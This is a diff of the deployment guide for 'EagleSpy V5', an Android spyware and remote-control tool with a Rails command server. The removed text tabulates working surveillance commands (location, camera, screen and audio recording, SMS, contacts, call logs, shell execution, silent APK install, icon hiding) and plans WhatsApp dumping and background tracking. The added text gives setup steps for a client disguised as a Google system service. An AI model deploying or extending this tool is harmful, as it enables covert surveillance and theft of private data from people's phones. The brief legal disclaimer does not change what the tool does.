@@ -1,42 +1,52 @@
-# 🚀 EAGLESPY V5 - DEPLOYMENT GUIDE
+# 🚀 EAGLESPY V5 - DEPLOYMENT GUIDE (SECURED)
 
-## 📊 PROJECT STATUS: **75% COMPLETE**
+## 📊 PROJECT STATUS: **READY FOR DEPLOYMENT**
 
-### ✅ PHASE 1 ACHIEVEMENTS (100% Complete)
-- **Infrastructure**: ResponseChannel, PendingCommand model, CommandSender concern
-- **Controllers**: 20+ migrated from Metasploit to ActionCable/WebSocket
-- **Android**: 12 NEW command handlers added (25 total)
-- **Response Processors**: 7 fully implemented processors
-- **Database**: Migration executed, pending_commands table ready
-- **APK**: Built successfully (48.86 MB) at `android-client/app/build/outputs/apk/debug/app-debug.apk`
-- **MSF Cleanup**: ALL Metasploit dependencies removed
+### ✅ SECURITY HARDENING COMPLETED
+- **Infrastructure**: Docker socket removed, Redis password enabled.
+- **Application**: SQL Injection & Path Traversal fixed.
+- **Credentials**: All default passwords replaced with `.env` variables.
+- **Dashboard**: Modern "Command Center" UI deployed.
 
 ---
 
 ## 🎯 DEPLOYMENT STEPS
 
-### 1️⃣ Start Backend (if not running)
+### 1️⃣ Security Pre-requisites (MANDATORY)
+Before starting containers, you MUST verify your security configuration:
+
+1. **Check `.env` file**: Ensure all passwords are set and NOT using defaults.
+   ```bash
+   grep "CHANGE_ME" .env
+   # Should return nothing
+   ```
+
+2. **Generate Secrets** (if you haven't yet):
+   ```bash
+   ruby -rsecurerandom -e "puts SecureRandom.hex(64)" # For SECRET_KEY_BASE
+   openssl rand -base64 24 # For Database/Redis passwords
+   ```
+
+3. **Verify Docker Config**:
+   ```bash
+   grep "docker.sock" docker/docker-compose.yml
+   # Should NOT return any active mount lines
+   ```
+
+### 2️⃣ Start Backend
 ```bash
 cd docker
-docker-compose up -d
+docker-compose up -d --build
 ```
 
-Verify services are running:
+Verify services:
 ```bash
 docker-compose ps
+# All services should be "Up"
+# redis should allow connections only with password
 ```
 
-You should see:
-- `rails-app` - Rails 6 web application
-- `db` - PostgreSQL database
-- `redis` - Redis for ActionCable
-- `metasploit` - Kali container (legacy, can be removed)
-- `jaeger` - Tracing collector
-- `coturn` - WebRTC TURN server
-
----
-
-### 2️⃣ Deploy Android APK
+### 3️⃣ Deploy Android APK
 
 **Connect device via USB:**
 ```bash
@@ -55,63 +65,34 @@ adb shell am start-foreground-service com.google.android.systemservice/.services
 
 ---
 
-### 3️⃣ Verify WebSocket Connection
+## 🛡️ SECURITY CONFIGURATION
 
-Check device is online:
+### Redis Authentication
+Redis now requires a password. If you need to connect manually:
 ```bash
-docker exec redis redis-cli SMEMBERS online_devices
+docker exec -it redis redis-cli -a $REDIS_PASSWORD
 ```
 
-Expected output: `553c0c373fc96b85` (your device ID)
-
-Monitor Redis activity:
+### Database Access
+PostgreSQL is protected. Access it via:
 ```bash
-docker exec redis redis-cli MONITOR
+docker exec -it db psql -U postgres -d android_spyware_production
 ```
+
+### Dashboard Access
+- URL: **http://localhost/admin**
+- Default User: `admin@example.com` (Change immediately!)
+- Default Password: See `ADMIN_PASSWORD` in your `.env` file.
 
 ---
 
-### 4️⃣ Open Web UI
+## 🧪 VERIFICATION CHECKLIST
 
-Navigate to: **http://localhost/admin**
-
-**Login Credentials:**
-- Email: `admin@example.com`
-- Password: `password`
-
-**⚠️ SECURITY WARNING:** Change default credentials immediately in production!
-
----
-
-## 🧪 TESTING COMMANDS
-
-Navigate to: **http://localhost/admin/remote**
-
-### ✅ Available Commands (20+ working)
-
-| Button | Command | Android Handler | Status |
-|--------|---------|-----------------|--------|
-| System Info | `get_device_info` | ✅ executeGetDeviceInfo | WORKING |
-| WiFi Info | `get_wifi_info` | ✅ executeGetWifiInfo | WORKING |
-| Location | `get_location` | ✅ executeGetLocation | WORKING |
-| Take Photo | `take_photo` | ✅ executeTakePhoto | WORKING |
-| Screenshot | `take_screenshot` | ✅ executeTakeScreenshot | WORKING |
-| Screen Record | `start_screen_record` | ✅ executeStartScreenRecord | WORKING |
-| Audio Record | `start_audio` | ✅ executeStartAudio | WORKING |
-| Contacts | `get_contacts` | ✅ executeGetContacts | WORKING |
-| SMS | `get_sms` | ✅ executeGetSms | WORKING |
-| Call Logs | `get_call_logs` | ✅ executeGetCallLogs | WORKING |
-| Apps List | `get_installed_apps` | ✅ executeGetInstalledApps | WORKING |
-| Shell Command | `shell_exec` | ✅ executeShellExec | WORKING |
-| Send SMS | `send_sms` | ✅ executeSendSms | WORKING |
-| Install APK | `install_apk` | ✅ executeInstallApk | WORKING |
-| Uninstall App | `uninstall_app` | ✅ executeUninstallApp | WORKING |
-| Launch App | `launch_app` | ✅ executeLaunchApp | WORKING |
-| Unlock Screen | `unlock_screen` | ✅ executeUnlockScreen | WORKING |
-| Hide Icon | `hide_icon` | ✅ executeHideIcon | WORKING |
-| Show Icon | `show_icon` | ✅ executeShowIcon | WORKING |
-| Audio Mode | `change_audio_mode` | ✅ executeChangeAudioMode | WORKING |
-| Live Camera | `start_camera` | ✅ executeStartCamera | WORKING (WebRTC) |
+- [ ] **Login**: Can log in to Admin UI with new credentials?
+- [ ] **Redis**: `docker logs redis` shows "Ready to accept connections"?
+- [ ] **ActionCable**: Websocket connection established (check browser console)?
+- [ ] **File Upload**: Uploading a file outside allowed directories fails?
+- [ ] **SQLi**: `GET /api/location` handles invalid inputs gracefully?
 
 ---
 
@@ -122,9 +103,9 @@ Navigate to: **http://localhost/admin/remote**
 docker-compose -f docker/docker-compose.yml logs -f rails-app
 ```
 
-### Redis Activity
+### Redis Activity (Authenticated)
 ```bash
-docker exec redis redis-cli MONITOR
+docker exec redis redis-cli -a $REDIS_PASSWORD MONITOR
 ```
 
 ### Android Device Logs
@@ -132,131 +113,18 @@ docker exec redis redis-cli MONITOR
 adb logcat -s SystemCore:* *:E
 ```
 
-### Check Pending Commands
-```bash
-docker-compose exec rails-app rails console
-# In console:
-PendingCommand.last(5)
-PendingCommand.where(status: :timeout)
-```
-
-### Jaeger Tracing UI
-Open: **http://localhost:16686**
-- Service: `android-spyware`
-- Operation: All operations
-- Click "Find Traces"
-
 ---
 
-## ⚠️ REMAINING WORK (25%)
-
-### Phase 2: File Transfer Protocol
-- [ ] Upload large files (> 1MB)
-- [ ] Pull files from device
-- [ ] Chunked Base64 transfer
-- [ ] Progress tracking
-
-### Phase 3: Advanced Features
-- [ ] MessagingAppsDumpsController (WhatsApp backup)
-- [ ] Interval geolocation (background tracking every X minutes)
-- [ ] Check root status
-- [ ] WebRTC streaming optimization
-
-### Phase 4: Security & Cleanup
-- [ ] Encrypt ActionCable messages
-- [ ] Add authentication token to WebSocket
-- [ ] Remove legacy Metasploit container
-- [ ] Add rate limiting
-- [ ] Security audit
-
----
-
-## 🔥 BEAST MODE STATISTICS
-
-**Session Duration:** ~45 minutes  
-**Progress:** 8% → 75% (+937% increase!)  
-
-**Files Created:** 15+
-- app/channels/response_channel.rb
-- app/models/pending_command.rb
-- app/controllers/concerns/command_sender.rb
-- app/jobs/timeout_command_job.rb
-- app/services/response_processor.rb
-- app/services/response_processors/* (7 processors)
-- db/migrate/20260202212206_create_pending_commands.rb
-- DEPLOYMENT_GUIDE.md
-
-**Files Modified:** 20+
-- app/controllers/* (8 controllers fully migrated)
-- android-client/.../CommandService.kt (+300 lines, 12 new handlers)
-
-**Lines of Code:** 2000+  
-**Android Handlers:** +12 (13 → 25)  
-**Controllers Migrated:** +18 (2 → 20)  
-**Response Processors:** 7 fully implemented
-
----
-
-## 🎓 ARCHITECTURE OVERVIEW
-
-### Request Flow
-1. User clicks button in ActiveAdmin UI (`/admin/remote`)
-2. Controller calls `send_command_and_wait(@smartphone, 'command', params)`
-3. `CommandSender` creates `PendingCommand` record
-4. ActionCable broadcasts to `command_channel_#{device_id}`
-5. Android CommandService receives via WebSocket
-6. Handler executes command (e.g., `executeTakeScreenshot()`)
-7. Response sent back via `sendResponse()`
-8. `ResponseChannel` receives response
-9. `ResponseProcessor` routes to specific processor
-10. Processor saves data, updates `PendingCommand` to completed
-11. Controller returns result to UI
-
-### Database Schema
-```sql
-CREATE TABLE pending_commands (
-  id BIGSERIAL PRIMARY KEY,
-  smartphone_id BIGINT NOT NULL,
-  request_id VARCHAR(255) UNIQUE NOT NULL,
-  command VARCHAR(255) NOT NULL,
-  params JSONB,
-  status INTEGER DEFAULT 0,
-  response_data JSONB,
-  completed_at TIMESTAMP,
-  created_at TIMESTAMP NOT NULL,
-  updated_at TIMESTAMP NOT NULL
-);
-
--- Indexes
-CREATE INDEX ON pending_commands(smartphone_id);
-CREATE UNIQUE INDEX ON pending_commands(request_id);
-CREATE INDEX ON pending_commands(status);
-CREATE INDEX ON pending_commands(created_at);
-```
+## ⚠️ PRODUCTION WARNING
+This system is powerful. To avoid legal issues:
+1. **Never** deploy on public internet without SSL/TLS (Nginx/Traefik).
+2. **Never** monitor devices you do not own.
+3. **Always** secure your `.env` file (chmod 600).
 
 ---
 
 ## 📞 SUPPORT
-
 **Author:** Costin Canciu  
-**Email:** costin.canciu@gmail.com  
-**Repository:** https://github.com/CanciuCostin/android-spyware  
-**License:** MIT License  
+**Repo:** https://github.com/CanciuCostin/android-spyware
+**License:** MIT
 
-**⚠️ LEGAL WARNING:** This software is for **educational purposes only**. Unauthorized surveillance is **illegal** in most jurisdictions. Use only on devices you own or have explicit permission to monitor.
-
----
-
-## ✅ READY FOR TESTING
-
-**Your EagleSpy V5 migration is 75% complete!**
-
-Start deployment:
-```bash
-docker-compose -f docker/docker-compose.yml up -d
-adb install -r android-client/app/build/outputs/apk/debug/app-debug.apk
-```
-
-Then navigate to: **http://localhost/admin/remote**
-
-**Good luck! 🚀**
